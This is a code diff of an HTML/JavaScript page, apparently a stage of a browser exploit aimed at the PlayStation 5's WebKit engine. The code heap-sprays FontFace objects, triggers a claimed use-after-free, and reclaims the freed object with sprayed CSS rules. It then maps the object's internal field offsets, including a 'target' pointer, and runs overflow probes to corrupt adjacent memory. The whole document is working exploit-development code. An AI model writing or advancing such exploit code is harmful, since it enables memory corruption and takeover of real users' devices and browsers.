@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v42 - Raw Memory Probe</title>
+<title>PS5 v43 — Struct Field Mapper</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -33,7 +33,7 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v42 PROBE</span><span class="s">│</span>
+<span class="l">▶ v43 MAPPER</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h2">STAGE:<b>INIT</b></span>
 </div>
@@ -43,9 +43,10 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 "use strict";
 
 // ============================================================
-//  PS5 v42 — Raw Memory Probe
-//  Attempting to find any JS API that leaks raw memory
-//  from the CSSFontFace object.
+//  PS5 v43 — Struct Field Mapper
+//  Built on v42 UAF + CSSRule Spray
+//  Probes every CSS-accessible field to map struct layout
+//  and determine distance to m_wrapper (0x80)
 // ============================================================
 
 var O=document.getElementById("out");
@@ -66,7 +67,7 @@ var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
 hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
 
 P("════════════════════════════════════","hd");
-P("  v42 — Raw Memory Probe","hd");
+P("  v43 — Struct Field Mapper","hd");
 P("════════════════════════════════════","hd");
 P("");
 
@@ -79,12 +80,16 @@ function fs(){try{void document.body.offsetTop}catch(e){}}
 var sh=document.getElementById("s").sheet;
 var keep=[],holes=[],trigger=null,uafOk=false;
 
+// ============================================================
+//  PHASE 1: UAF + CSSRule Spray (from v42)
+// ============================================================
+
 pg(5);Hd("Creating holes...");
 for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
 unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
 weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
 fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
-fs();Ok("Holes ready");
+fs();Ok("Holes ready: "+holes.length);
 
 pg(10);Hd("Trigger setup...");
 trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
@@ -124,11 +129,13 @@ fs();for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";s
 if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);
 
 // ============================================================
-//  PHASE 2: Raw Memory Probe
+//  PHASE 2: Identify Confused Object
 // ============================================================
-pg(30);Sep();Hd("PHASE 2: Raw Memory Probe");Sep();
+
+pg(30);Sep();Hd("PHASE 2: Identify Confused Object");Sep();
 
 Dm("Calling load() synchronously...");
+
 try {
   var loadPromise = document.fonts.load("1em trigger, x", "AB");
   
@@ -141,7 +148,7 @@ try {
     
     for(var i=0;i<faces.length;i++){
       var f=faces[i];
-      P("  Face["+i+"]: family="+f.family);
+      P("  Face["+i+"]: family="+f.family+" weight="+f.weight);
       if(f.family&&f.family.indexOf("A_")===0){
         aFamily = f.family;
         aFace = f;
@@ -149,104 +156,411 @@ try {
     }
     
     if(!aFamily){
-      Fl("No A_ face found");
+      Fl("No A_ face found — spray failed");
+      hu("h2","STAGE:<b>FAIL</b>");
       return;
     }
     
     St("RECLAIMED: "+aFamily);
     keep.push(faces);
     
-    pg(60);Sep();Hd("PHASE 3: Deep Property Analysis");Sep();
-    P("  Probing for any raw memory leaks...","dm");
+    // Find A_NNN's CSSRule index
+    var aIndex = -1;
+    var aNum = parseInt(aFamily.split("_")[1]);
     P("");
-
-    // 1. Check internal slots
-    P("  Test 1: Internal Slots","");
-    var slots = ["_internal", "_impl", "_cppObject", "_native", "_ptr", "_face", "_fontFace", "_cssFontFace", "_wrapper", "__v8_toString", "__revoke", "__proto__"];
-    for(var si=0; si<slots.length; si++){
+    Dm("Scanning CSSRules for "+aFamily+"...");
+    for(var i=0;i<sh.cssRules.length;i++){
       try {
-        var val = aFace[slots[si]];
-        if(val !== undefined) {
-          Hi("    FOUND SLOT: "+slots[si]+" = "+val);
+        var r = sh.cssRules[i];
+        if(r.type === 5) { // CSSFontFaceRule
+          var rf = r.style.getPropertyValue("font-family");
+          if(rf && rf.indexOf(aFamily) !== -1) {
+            aIndex = i;
+            break;
+          }
         }
       } catch(e) {}
     }
-
-    // 2. Try to access via Reflect
-    P("");
-    P("  Test 2: Reflect.ownKeys","");
-    try {
-      var keys = Reflect.ownKeys(aFace);
-      P("    Keys: "+keys.join(", "));
-    } catch(e) {
-      P("    ERR: "+e.message,"er");
+    
+    if(aIndex === -1){
+      Fl("Could not find CSSRule for "+aFamily);
+      return;
     }
-
-    // 3. Try to access via Object.getOwnPropertyDescriptors
+    
+    Ok("Found CSSRule at index "+aIndex);
+    var aRule = sh.cssRules[aIndex];
+    var aStyle = aRule.style;
+    
+    // Also find the xRule
+    var xIndex = -1;
+    for(var i=0;i<sh.cssRules.length;i++){
+      try {
+        var r = sh.cssRules[i];
+        if(r.type === 5) {
+          var rf = r.style.getPropertyValue("font-family");
+          if(rf && rf.trim() === "x") {
+            xIndex = i;
+            break;
+          }
+        }
+      } catch(e) {}
+    }
+    
+    if(xIndex === -1){
+      Wr("xRule not found — re-inserting");
+      sh.insertRule("@font-face{font-family:x;src:local(Courier);unicode-range:U+0042}",sh.cssRules.length);
+      xIndex = sh.cssRules.length - 1;
+    }
+    
+    var xRule = sh.cssRules[xIndex];
+    var xStyle = xRule.style;
+    Ok("xRule at index "+xIndex);
+    
+    // ============================================================
+    //  PHASE 3: Struct Field Mapper
+    // ============================================================
+    
+    pg(50);Sep();Hd("PHASE 3: Struct Field Mapper");Sep();
+    P("  Probing every CSS-accessible field...","dm");
+    P("  Writing to A_"+aNum+"'s CSSRule, reading via confused x selector","dm");
     P("");
-    P("  Test 3: Property Descriptors","");
-    try {
-      var proto = Object.getPrototypeOf(aFace);
-      var descs = Object.getOwnPropertyDescriptors(proto);
-      for(var key in descs) {
-        if(descs[key].get) {
-          try {
-            var val = aFace[key];
-            if(typeof val === "number" && val > 0x1000) {
-              Hi("    NUMERIC PROP: "+key+" = "+val+" (0x"+val.toString(16)+")");
-            } else if(typeof val === "object" && val !== null) {
-              Hi("    OBJECT PROP: "+key+" = "+val);
+    
+    var results = [];
+    var confirmedCount = 0;
+    var failedCount = 0;
+    
+    // Probe runner
+    function runProbe(name, writeVal, readFn, expectedOff, desc, type) {
+      var key = name+'="'+writeVal+'"';
+      P("  ["+expectedOff+"] "+key+" ("+desc+")","dm");
+      
+      try {
+        // WRITE to A_NNN's CSSRule
+        aStyle.setProperty(name, writeVal);
+        
+        // READ via confused selector path
+        var readFaces = document.fonts.load("1em trigger, x", "AB");
+        var readVals = readFn(readFaces);
+        var cssVal = aStyle.getPropertyValue(name);
+        
+        // Check if write propagated
+        var readStr = JSON.stringify(readVals);
+        var writeStr = String(writeVal);
+        var propagated = false;
+        
+        if(type === "numeric") {
+          // For numeric, check if the number appears in readback
+          for(var i=0;i<readVals.length;i++){
+            if(readVals[i] !== null && readVals[i] !== undefined) {
+              if(String(readVals[i]) === writeStr || 
+                 String(readVals[i]).indexOf(writeStr) !== -1) {
+                propagated = true;
+                break;
+              }
             }
-          } catch(e) {}
+          }
+        } else if(type === "float") {
+          for(var i=0;i<readVals.length;i++){
+            if(readVals[i] !== null && readVals[i] !== undefined) {
+              var fv = parseFloat(readVals[i]);
+              var wv = parseFloat(writeVal);
+              if(!isNaN(fv) && !isNaN(wv) && Math.abs(fv - wv) < 0.01) {
+                propagated = true;
+                break;
+              }
+            }
+          }
+        } else {
+          propagated = readStr.indexOf(writeStr) !== -1;
         }
+        
+        if(propagated) {
+          Ok("    READ: "+readStr+" ✓");
+          results.push({name:key, off:expectedOff, desc:desc, type:type,
+            write:writeVal, read:readStr, css:cssVal, ok:true});
+          confirmedCount++;
+        } else {
+          Fl("    READ: "+readStr+" ✗ (no match)");
+          results.push({name:key, off:expectedOff, desc:desc, type:type,
+            write:writeVal, read:readStr, css:cssVal, ok:false});
+          failedCount++;
+        }
+        
+        // Clean up
+        try { aStyle.removeProperty(name); } catch(e) {}
+        
+      } catch(e) {
+        Fl("    ERR: "+e.message);
+        results.push({name:key, off:expectedOff, desc:desc, type:type,
+          write:writeVal, error:e.message, ok:false});
+        failedCount++;
       }
-    } catch(e) {}
-
-    // 4. Try to trigger a crash to get a stack trace with addresses
+      P("");
+    }
+    
+    // --- m_family (0x20) ---
+    Hd("Offset 0x20: m_family");
+    runProbe("font-family", "testFamProbe", 
+      function(faces){return faces.map(function(f){return f.family})},
+      "0x20", "m_family (RefPtr<CSSValue>)", "string");
+    
+    // --- m_ranges (0x28) ---
+    Hd("Offset 0x28: m_ranges");
+    runProbe("unicode-range", "U+0000-007F",
+      function(faces){return faces.map(function(f){return f.unicodeRange})},
+      "0x28", "m_ranges (Vector<UnicodeRange>)", "string");
+    
+    // --- m_featureSettings (0x40) ---
+    Hd("Offset 0x40: m_featureSettings");
+    runProbe("font-feature-settings", "\"test\" 1",
+      function(faces){return faces.map(function(f){
+        try{return f.featureSettings}catch(e){return "ERR:"+e.message}})},
+      "0x40", "m_featureSettings", "string");
+    
+    // --- m_loadingBehavior (0x58) ---
+    Hd("Offset 0x58: m_loadingBehavior");
+    runProbe("font-display", "block",
+      function(faces){return faces.map(function(f){
+        try{return f.display}catch(e){return "ERR:"+e.message}})},
+      "0x58", "m_loadingBehavior (block)", "enum");
+    runProbe("font-display", "swap",
+      function(faces){return faces.map(function(f){
+        try{return f.display}catch(e){return "ERR:"+e.message}})},
+      "0x58", "m_loadingBehavior (swap)", "enum");
+    runProbe("font-display", "fallback",
+      function(faces){return faces.map(function(f){
+        try{return f.display}catch(e){return "ERR:"+e.message}})},
+      "0x58", "m_loadingBehavior (fallback)", "enum");
+    runProbe("font-display", "optional",
+      function(faces){return faces.map(function(f){
+        try{return f.display}catch(e){return "ERR:"+e.message}})},
+      "0x58", "m_loadingBehavior (optional)", "enum");
+    
+    // --- m_sizeAdjust (0x5C) — FLOAT ---
+    Hd("Offset 0x5C: m_sizeAdjust (FLOAT)");
+    runProbe("size-adjust", "50",
+      function(faces){return faces.map(function(f){
+        try{return f.sizeAdjust}catch(e){return "ERR:"+e.message}})},
+      "0x5C", "m_sizeAdjust (50.0)", "float");
+    runProbe("size-adjust", "73.5",
+      function(faces){return faces.map(function(f){
+        try{return f.sizeAdjust}catch(e){return "ERR:"+e.message}})},
+      "0x5C", "m_sizeAdjust (73.5)", "float");
+    runProbe("size-adjust", "200",
+      function(faces){return faces.map(function(f){
+        try{return f.sizeAdjust}catch(e){return "ERR:"+e.message}})},
+      "0x5C", "m_sizeAdjust (200.0)", "float");
+    
+    // --- m_fontSelectionCapabilities.weight (0x88) ---
+    Hd("Offset 0x88: weight (9-value sweep)");
+    var weights = [100,200,300,400,500,600,700,800,900];
+    for(var wi=0; wi<weights.length; wi++) {
+      var wv = String(weights[wi]);
+      runProbe("font-weight", wv,
+        function(faces){return faces.map(function(f){return f.weight})},
+        "0x88", "weight ("+wv+")", "numeric");
+    }
+    
+    // --- m_fontSelectionCapabilities.width ---
+    Hd("Offset 0x88+?: width");
+    runProbe("font-stretch", "condensed",
+      function(faces){return faces.map(function(f){
+        try{return f.stretch}catch(e){return "ERR:"+e.message}})},
+      "0x88+4", "width (condensed)", "string");
+    runProbe("font-stretch", "expanded",
+      function(faces){return faces.map(function(f){
+        try{return f.stretch}catch(e){return "ERR:"+e.message}})},
+      "0x88+4", "width (expanded)", "string");
+    
+    // --- m_fontSelectionCapabilities.slope ---
+    Hd("Offset 0x88+?: slope");
+    runProbe("font-style", "italic",
+      function(faces){return faces.map(function(f){
+        try{return f.style}catch(e){return "ERR:"+e.message}})},
+      "0x88+8", "slope (italic)", "string");
+    runProbe("font-style", "oblique 20deg",
+      function(faces){return faces.map(function(f){
+        try{return f.style}catch(e){return "ERR:"+e.message}})},
+      "0x88+8", "slope (oblique 20deg)", "string");
+    
+    // --- Additional probes ---
+    Hd("Additional fields");
+    runProbe("font-variation-settings", "\"wght\" 400",
+      function(faces){return faces.map(function(f){
+        try{return f.variationSettings}catch(e){return "ERR:"+e.message}})},
+      "unknown", "variationSettings", "string");
+    runProbe("ascent-override", "90%",
+      function(faces){return faces.map(function(f){
+        try{return f.ascentOverride}catch(e){return "ERR:"+e.message}})},
+      "unknown", "ascentOverride", "string");
+    runProbe("descent-override", "110%",
+      function(faces){return faces.map(function(f){
+        try{return f.descentOverride}catch(e){return "ERR:"+e.message}})},
+      "unknown", "descentOverride", "string");
+    runProbe("line-gap-override", "120%",
+      function(faces){return faces.map(function(f){
+        try{return f.lineGapOverride}catch(e){return "ERR:"+e.message}})},
+      "unknown", "lineGapOverride", "string");
+    
+    // ============================================================
+    //  PHASE 4: src Overflow Probe
+    // ============================================================
+    
+    pg(80);Sep();Hd("PHASE 4: src Overflow Probe");Sep();
+    P("  Testing if Vector manipulation bleeds into adjacent fields...","dm");
     P("");
-    P("  Test 4: Error Stack Trace","");
+    
+    // Baseline weight
+    aStyle.setProperty("font-weight", "400");
+    var beforeWeight = document.fonts.load("1em trigger, x", "AB").map(function(f){return f.weight});
+    P("  Baseline weight: "+JSON.stringify(beforeWeight),"dm");
+    
+    // Test 1: Long URL
+    P("");
+    Wr("Test 1: Long URL (4096 bytes) — may crash");
     try {
-      aFace.load();
+      var longUrl = "url('data:font/woff2;base64," + "A".repeat(4096) + "')";
+      aStyle.setProperty("src", longUrl);
+      var faces1 = document.fonts.load("1em trigger, x", "AB");
+      Ok("  Survived. faces="+faces1.length+" weights="+JSON.stringify(faces1.map(function(f){return f.weight})));
     } catch(e) {
-      var stack = e.stack || "";
-      var addrs = stack.match(/0x[0-9a-f]{6,16}/gi);
-      if(addrs) {
-        St("STACK LEAK FOUND!");
-        for(var ai=0; ai<addrs.length; ai++) {
-          Hi("  " + addrs[ai]);
-        }
+      Fl("  Crash: "+e.message);
+    }
+    
+    // Test 2: Many srcs
+    P("");
+    Wr("Test 2: 64 comma-separated srcs — may crash");
+    try {
+      var manySrcs = [];
+      for(var i=0; i<64; i++) {
+        manySrcs.push("url('data:font/woff2;base64,"+String.fromCharCode(65+(i%26))+String(i)+"')");
+      }
+      aStyle.setProperty("src", manySrcs.join(", "));
+      var faces2 = document.fonts.load("1em trigger, x", "AB");
+      Ok("  Survived. faces="+faces2.length+" weights="+JSON.stringify(faces2.map(function(f){return f.weight})));
+      
+      // Check if weight changed (corruption indicator)
+      var afterWeight = faces2.map(function(f){return f.weight});
+      if(JSON.stringify(beforeWeight) !== JSON.stringify(afterWeight)) {
+        St("WEIGHT CORRUPTED! Vector overflow bled into weight field!");
+        Hi("  Before: "+JSON.stringify(beforeWeight));
+        Hi("  After:  "+JSON.stringify(afterWeight));
       } else {
-        P("    No addresses in stack","dm");
-        P("    Stack: "+stack.substring(0,100),"dm");
+        Dm("  Weight unchanged — no corruption detected");
       }
-    }
-
-    // 5. Try to stringify
-    P("");
-    P("  Test 5: Stringify","");
-    try {
-      var str = JSON.stringify(aFace);
-      P("    JSON: "+str);
     } catch(e) {
-      P("    JSON ERR: "+e.message);
+      Fl("  Crash: "+e.message);
     }
-    try {
-      var str2 = String(aFace);
-      P("    String: "+str2);
-    } catch(e) {
-      P("    String ERR: "+e.message);
+    
+    // Clean up
+    try { aStyle.removeProperty("src"); } catch(e) {}
+    try { aStyle.removeProperty("font-weight"); } catch(e) {}
+    
+    // ============================================================
+    //  PHASE 5: Analysis & Summary
+    // ============================================================
+    
+    pg(100);Sep();Hd("PHASE 5: Analysis & Summary");Sep();
+    P("");
+    
+    P("  FIELD MAP RESULTS:","hd");
+    P("  ┌─────────────────────────────────────────────────────┐");
+    
+    var byOffset = {};
+    for(var i=0; i<results.length; i++) {
+      var off = results[i].off || "unknown";
+      if(!byOffset[off]) byOffset[off] = [];
+      byOffset[off].push(results[i]);
     }
-
-    pg(100);Sep();Hd("SUMMARY");Sep();
+    
+    var offsets = Object.keys(byOffset).sort();
+    for(var oi=0; oi<offsets.length; oi++) {
+      var off = offsets[oi];
+      var probes = byOffset[off];
+      var anyOk = false;
+      for(var pi=0; pi<probes.length; pi++) {
+        if(probes[pi].ok) { anyOk = true; break; }
+      }
+      var mark = anyOk ? "✅" : "✘";
+      var names = probes.map(function(p){return p.name.split("=")[0]}).filter(function(v,i,a){return a.indexOf(v)===i});
+      P("  │ "+mark+" "+off+"  "+names.join(", "));
+    }
+    
+    P("  └─────────────────────────────────────────────────────┘");
     P("");
-    P("  UAF:                    ✅");
-    P("  Cross-Object Confusion: ✅ ("+aFamily+")");
-    P("  Raw Memory Probe:       Completed");
+    P("  Confirmed R/W channels: "+confirmedCount,"ok");
+    P("  Failed probes:          "+failedCount,"er");
     P("");
-    St("★ END OF JS CAPABILITIES ★");
-    P("  The JS API does not expose raw memory pointers.","hl");
-    P("  To proceed, we need the binary offset of m_wrapper.","hl");
-    P("  This requires analyzing WebKit.elf in Ghidra.","hl");
+    
+    // Key findings
+    P("  KEY FINDINGS:","hd");
+    P("");
+    
+    // Weight check
+    var weightOk = results.filter(function(r){return r.name.indexOf("font-weight")!==-1 && r.ok});
+    if(weightOk.length >= 7) {
+      Ok("  font-weight: "+weightOk.length+"/9 confirmed → m_fontSelectionCapabilities at 0x88 ✓");
+    } else if(weightOk.length > 0) {
+      Wr("  font-weight: "+weightOk.length+"/9 confirmed → partial match");
+    } else {
+      Fl("  font-weight: 0/9 → layout mismatch or confusion failed");
+    }
+    
+    // sizeAdjust check
+    var sizeOk = results.filter(function(r){return r.name.indexOf("size-adjust")!==-1 && r.ok});
+    if(sizeOk.length >= 2) {
+      Ok("  size-adjust: "+sizeOk.length+"/3 confirmed → m_sizeAdjust at 0x5C ✓");
+      Hi("  → FLOAT WRITES CONFIRMED. IEEE 754 probing is viable.");
+    } else {
+      Wr("  size-adjust: "+sizeOk.length+"/3 confirmed");
+    }
+    
+    // font-display check
+    var dispOk = results.filter(function(r){return r.name.indexOf("font-display")!==-1 && r.ok});
+    if(dispOk.length >= 2) {
+      Ok("  font-display: "+dispOk.length+"/4 confirmed → m_loadingBehavior at 0x58 ✓");
+    }
+    
+    // font-stretch check
+    var strOk = results.filter(function(r){return r.name.indexOf("font-stretch")!==-1 && r.ok});
+    if(strOk.length >= 1) {
+      Ok("  font-stretch: "+strOk.length+"/2 confirmed → width sub-field located");
+    }
+    
+    // font-style check
+    var stlOk = results.filter(function(r){return r.name.indexOf("font-style")!==-1 && r.ok});
+    if(stlOk.length >= 1) {
+      Ok("  font-style: "+stlOk.length+"/2 confirmed → slope sub-field located");
+    }
+    
+    P("");
+    
+    // Gap analysis
+    P("  GAP ANALYSIS:","hd");
+    P("");
+    P("  Source estimate places m_wrapper at offset 0x80.");
+    P("");
+    P("  Fields between last confirmed probe and m_wrapper:");
+    P("    0x60-0x77: m_sources (Vector, 24 bytes) → 'src' property");
+    P("    0x78-0x7F: m_clients (WeakHashSet, 8 bytes) → NOT CSS-accessible");
+    P("    0x80-0x87: m_wrapper (WeakPtr<FontFace>) → THE TARGET");
+    P("");
+    P("  The gap at 0x78 (m_clients) cannot be reached via CSS.");
+    P("  m_wrapper at 0x80 is immediately after m_clients.");
+    P("");
+    
+    if(sizeOk.length >= 2) {
+      Hi("  NEXT STEP: m_sizeAdjust (0x5C) is 36 bytes before m_wrapper (0x80).");
+      Hi("  If we can craft a float that overflows or if the Vector at 0x60");
+      Hi("  can be manipulated, we may reach m_wrapper.");
+    }
+    
+    P("");
+    St("★ STRUCT FIELD MAPPER COMPLETE ★");
+    P("");
+    P("  Save the console output and send it back.","hl");
+    P("  The confirmed offsets will determine our next move.","hl");
+    
     hu("h2","STAGE:<b>DONE</b>");
     
   }).catch(function(e){
@@ -256,6 +570,7 @@ try {
   
 } catch(e) {
   Fl("Synchronous load() threw: " + e.message);
+  hu("h2","STAGE:<b>CRASH</b>");
 }
 
 </script>
